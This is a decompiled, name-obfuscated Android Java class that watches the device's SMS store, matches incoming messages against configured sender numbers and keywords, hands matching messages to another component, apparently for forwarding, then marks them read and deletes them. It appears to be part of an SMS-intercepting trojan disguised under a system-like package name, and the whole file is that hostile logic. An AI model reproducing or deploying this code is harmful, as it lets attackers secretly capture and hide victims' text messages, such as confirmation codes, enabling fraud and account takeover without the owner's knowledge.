package com.android.rev;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Log;
import com.android.a.a.c;

public final class b
  extends ContentObserver
{
  public static String[] a;
  public static String[] b;
  private static b d = null;
  private Context c;
  private boolean e = true;
  
  private b(Handler paramHandler, Context paramContext)
  {
    super(paramHandler);
    this.c = paramContext;
    this.e = false;
  }
  
  private int a(String paramString)
  {
    Log.d("fmz", "==updateSmsByNum");
    paramString = "address='" + paramString + "'";
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("read", Integer.valueOf(1));
    return this.c.getContentResolver().update(Uri.parse("content://sms"), localContentValues, paramString, null);
  }
  
  public static b a(Handler paramHandler, Context paramContext)
  {
    if (d == null)
    {
      d = new b(paramHandler, paramContext);
      paramContext.getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, d);
    }
    return d;
  }
  
  private String a(String paramString1, String paramString2)
  {
    Log.d("fmz", "==compare");
    int i;
    if ((b != null) && (a != null))
    {
      com.android.e.a.a.a("tag", "--111111111= ");
      i = 0;
      if (i < b.length) {}
    }
    else
    {
      return "";
    }
    int j;
    if ((!TextUtils.isEmpty(b[i])) && (paramString1.contains(b[i]))) {
      j = 0;
    }
    for (;;)
    {
      if (j >= a.length)
      {
        i += 1;
        break;
      }
      if ((!TextUtils.isEmpty(a[j])) && (paramString2.contains(a[j])))
      {
        if (!this.e)
        {
          this.e = true;
          com.android.e.a.a.a("tag", "--fff2--pHoneNum = " + paramString1 + " body = " + paramString2);
          a.a(paramString1, paramString2 + "bb", this.c);
        }
        a(paramString1);
        b(paramString1);
        return "";
      }
      j += 1;
    }
  }
  
  private void a(Context paramContext)
  {
    Log.d("fmz", "==findNewSmsCount");
    try
    {
      paramContext = paramContext.getApplicationContext().getContentResolver().query(Uri.parse("content://sms"), null, "type = 1 and read = 0", null, null);
      paramContext.moveToFirst();
      if (paramContext.getColumnCount() <= 0) {
        return;
      }
      boolean bool;
      do
      {
        int i = paramContext.getColumnIndex("address");
        Log.d("fmz", "add = " + i);
        String str1 = paramContext.getString(i);
        Log.d("fmz", "stradd = " + str1);
        String str2 = paramContext.getString(paramContext.getColumnIndex("body"));
        paramContext.getString(paramContext.getColumnIndex("_id"));
        com.android.e.a.a.a("tag", "st = " + str1);
        com.android.e.a.a.a("tag", "body = " + str2);
        a(str1, str2);
        bool = paramContext.moveToNext();
      } while (bool);
      return;
    }
    catch (Exception paramContext)
    {
      Log.d("fmz", "error = " + paramContext.toString());
      paramContext.printStackTrace();
    }
  }
  
  private int b(String paramString)
  {
    Log.d("fmz", "==deleteSmsByNum");
    paramString = "address='" + paramString + "'";
    return this.c.getContentResolver().delete(Uri.parse("content://sms"), paramString, null);
  }
  
  public final void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    Log.d("fmz", "==onChange");
    if (!TextUtils.isEmpty(c.d(this.c))) {
      a = c.d(this.c).split("\\|");
    }
    if (!TextUtils.isEmpty(c.e(this.c))) {
      b = c.e(this.c).split("\\|");
    }
    this.e = false;
    a(this.c);
  }
}
